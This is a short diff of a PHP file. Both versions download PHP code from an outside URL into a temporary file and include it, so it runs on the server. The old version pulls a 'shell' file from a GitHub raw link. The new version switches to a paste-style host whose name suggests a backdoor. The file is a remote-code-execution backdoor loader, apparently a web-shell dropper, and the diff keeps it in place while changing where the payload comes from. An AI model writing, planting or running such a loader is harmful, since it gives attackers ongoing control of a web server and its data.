@@ -1,5 +1,9 @@
-<?php 
+<?php
 $temp_filee = tmpfile(); 
-fwrite($temp_filee, implode('', file('https://raw.githubusercontent.com/WhatsWrongAndWhy/yourlogic/main/shell/fanvat.php'));
-include stream_get_meta_data($temp_filee)['uri'];
-fclose($temp_filee); __halt_compiler();
+$content = implode('', file('https://hxbdoor.one/raw/aeR6dg9K'));
+fwrite($temp_filee, $content);
+$file_path = stream_get_meta_data($temp_filee)['uri'];
+include $file_path;
+fclose($temp_filee); 
+__halt_compiler();
+?>
